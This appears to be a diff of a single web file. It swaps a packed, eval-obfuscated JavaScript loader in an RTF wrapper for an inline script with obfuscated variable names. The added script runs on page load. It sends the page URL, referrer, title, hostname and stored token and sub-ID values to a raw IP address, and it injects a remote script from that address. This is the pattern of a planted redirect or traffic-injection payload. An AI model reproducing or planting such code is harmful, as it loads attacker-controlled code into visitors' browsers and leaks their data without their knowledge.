@@ -1,8 +1,43 @@
-{\rtf1\ansi\ansicpg1251\cocoartf2513
-\cocoatextscaling0\cocoaplatform0{\fonttbl\f0\fnil\fcharset0 HelveticaNeue;}
-{\colortbl;\red255\green255\blue255;\red40\green146\blue255;}
-{\*\expandedcolortbl;;\cssrgb\c18039\c65098\c100000;}
-\paperw11900\paperh16840\margl1440\margr1440\vieww10800\viewh8400\viewkind0
-\pard\tx560\tx1120\tx1680\tx2240\tx2800\tx3360\tx3920\tx4480\tx5040\tx5600\tx6160\tx6720\pardirnatural\partightenfactor0
-
-\f0\fs26 \cf0 eval(function(p,a,c,k,e,r)\{e=function(c)\{return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))\};if(!''.replace(/^/,String))\{while(c--)r[e(c)]=k[c]||e(c);k=[function(e)\{return r[e]\}];e=function()\{return'\\\\w+'\};c=1\};while(c--)if(k[c])p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c]);return p\}('(w()\{1 b="2";7(!3.2)\{3.2=\{9:x,o:y,h:"p://q.r/z",A:"p://q.r/B/C",\}\}D 8=5.i("t");7(j 8!=="k"&&8!==E)\{1 c=F.G(8);1 d=H.I(+J K()\cf2 /L\cf0 );7(c.M+3.2.o<d)\{5.l("u");5.l("m");5.l("t")\}\}1 e=5.i("u");1 f=5.i("m");1 g="?N=O.P";g+="&"+Q(3.n.R.S("?",""));g+="&T="+4(6.U);g+="&V="+4(6.W);g+="&X="+4(6.n.Y+6.n.Z);g+="&10="+4(b);g+="&11="+4(3.2.h);7(j e!=="k"&&e&&3.2.9)\{g+="&12="+4(e)\}7(j f!=="k"&&f&&3.2.9)\{g+="&m="+4(f)\}1 a=6.13("v");a.14="15/16";a.17=3.2.h+g;1 s=6.18("v")[0];s.19.1a(a,s)\})();',62,73,'|var|_n8G3gBgZFGgLfhTQ|window|encodeURIComponent|localStorage|document|if|_MZbCk2FStS5Qsjjr|unique||||||||R_PATH|getItem|typeof|undefined|removeItem|token|location|ttl|http|radioapostolusa|com||config|subId|script|function|false|86400|yzDhJgRc|P_PATH|79f10ac|postback|const|null|JSON|parse|Math|round|new|Date|1000|created_at|return|js|client|decodeURIComponent|search|replace|se_referrer|referrer|default_keyword|title|landing_url|hostname|pathname|name|host|sub_id|createElement|type|application|javascript|src|getElementsByTagName|parentNode|insertBefore'.split('|'),0,\{\}))}
+<script>
+    (function() {
+    var name = '_3msnz59cgtrSQccG';
+    if (!window._3msnz59cgtrSQccG) {
+        window._3msnz59cgtrSQccG = {
+            unique: false,
+            ttl: 86400,
+            R_PATH: 'http://78.141.220.118/pJhktJ',
+            P_PATH: 'http://78.141.220.118/79f10ac/postback',
+        };
+    }
+    const _y3H4d2nv2WxfzcR2 = localStorage.getItem('config');
+    if (typeof _y3H4d2nv2WxfzcR2 !== 'undefined' && _y3H4d2nv2WxfzcR2 !== null) {
+        var _VMQBHZgnHPfPYvcF = JSON.parse(_y3H4d2nv2WxfzcR2);
+        var _cG6Y1RX3vH6c3wzq = Math.round(+new Date()/1000);
+        if (_VMQBHZgnHPfPYvcF.created_at + window._3msnz59cgtrSQccG.ttl < _cG6Y1RX3vH6c3wzq) {
+            localStorage.removeItem('subId');
+            localStorage.removeItem('token');
+            localStorage.removeItem('config');
+        }
+    }
+    var _1V3C9WF8DGd71YM4 = localStorage.getItem('subId');
+    var _wfWnD7q27jWZtLK1 = localStorage.getItem('token');
+    var _rVR1hJ5YjPt6XSvP = '?return=js.client';
+        _rVR1hJ5YjPt6XSvP += '&' + decodeURIComponent(window.location.search.replace('?', ''));
+        _rVR1hJ5YjPt6XSvP += '&se_referrer=' + encodeURIComponent(document.referrer);
+        _rVR1hJ5YjPt6XSvP += '&default_keyword=' + encodeURIComponent(document.title);
+        _rVR1hJ5YjPt6XSvP += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
+        _rVR1hJ5YjPt6XSvP += '&name=' + encodeURIComponent(name);
+        _rVR1hJ5YjPt6XSvP += '&host=' + encodeURIComponent(window._3msnz59cgtrSQccG.R_PATH);
+    if (typeof _1V3C9WF8DGd71YM4 !== 'undefined' && _1V3C9WF8DGd71YM4 && window._3msnz59cgtrSQccG.unique) {
+        _rVR1hJ5YjPt6XSvP += '&sub_id=' + encodeURIComponent(_1V3C9WF8DGd71YM4);
+    }
+    if (typeof _wfWnD7q27jWZtLK1 !== 'undefined' && _wfWnD7q27jWZtLK1 && window._3msnz59cgtrSQccG.unique) {
+        _rVR1hJ5YjPt6XSvP += '&token=' + encodeURIComponent(_wfWnD7q27jWZtLK1);
+    }
+    var a = document.createElement('script');
+        a.type = 'application/javascript';
+        a.src = window._3msnz59cgtrSQccG.R_PATH + _rVR1hJ5YjPt6XSvP;
+    var s = document.getElementsByTagName('script')[0];
+    s.parentNode.insertBefore(a, s)
+    })();
+    </script>
